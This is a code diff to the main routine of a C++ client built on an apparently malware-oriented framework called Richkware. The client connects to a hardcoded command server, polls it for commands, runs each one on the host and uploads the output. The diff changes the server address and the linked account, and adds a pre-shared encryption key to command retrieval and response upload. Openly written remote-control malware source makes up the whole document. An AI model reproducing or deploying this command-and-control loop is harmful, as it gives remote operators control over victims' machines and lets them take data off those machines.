@@ -11,9 +11,9 @@
 int main() {
     const char *appName = "Richk";
     const char *defaultEncryptionKey = "richktest"; // pre-shared key with RMS, to enable encryption before receiving a server-side generated key
-    const char *serverAddress = "172.24.9.142"; // Richkware-Manager-Server IP address
+    const char *serverAddress = "127.0.0.1"; // Richkware-Manager-Server IP address
     const char *port = "8080"; // Richkware-Manager-Server TCP port
-    const char *associatedUser = "richk@richk.me"; // account in RMS which is linked to
+    const char *associatedUser = "richk@i.it"; // account in RMS which is linked to
 //    int timeoutUploadInfo = 5000;
     // init framework
     Richkware richkware(appName, defaultEncryptionKey, serverAddress, port, associatedUser);
@@ -21,10 +21,10 @@ int main() {
     // PUT YOUR CODE HERE
 //    richkware.network.fetchCommand("172.17.238.81", "8080", "er@fv.it", "Richk");
 //    richkware.executeCommands();
-    std::vector<std::string> commands = richkware.getCommands();
+    std::vector<std::string> commands = richkware.getCommands(defaultEncryptionKey);
     while (true) {
         while (commands.size() == 1 && commands.at(0) == "") {
-            commands = richkware.getCommands();
+            commands = richkware.getCommands(defaultEncryptionKey);
             std::cout << "waiting for commands..." << std::endl;
             Sleep(5000);
         }
@@ -41,7 +41,7 @@ int main() {
             //        commands.pop_back();
         }
         response.append(/*Base64_encode(*/richkware.executeCommand(commands.at(commands.size() - 1)))/*)*/;
-        richkware.uploadCommandsResponse(Base64_encode((const unsigned char *) response.c_str(), response.size()));
+        richkware.uploadCommandsResponse(response, defaultEncryptionKey);
         std::cout << "response uploaded! (" << response << ")" << std::endl;
         commands.clear();
         system("PAUSE");
